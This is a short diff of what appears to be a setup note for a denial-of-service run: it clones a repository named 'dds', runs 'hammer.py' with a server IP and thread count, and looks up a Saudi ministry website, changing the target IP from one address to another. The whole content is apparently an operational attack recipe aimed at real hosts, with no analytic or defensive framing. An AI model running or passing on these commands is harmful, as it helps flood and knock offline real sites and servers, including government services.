@@ -6,9 +6,8 @@ cd ~
 git clone https://github.com/KingArmin/dds
 cd dds
 
+python3 hammer.py -s 136.243.145.232 -t 155
+
 nslookup www.moe.gov.sa
-
-python3 hammer.py -s 91.195.89.55
-
 
 ```
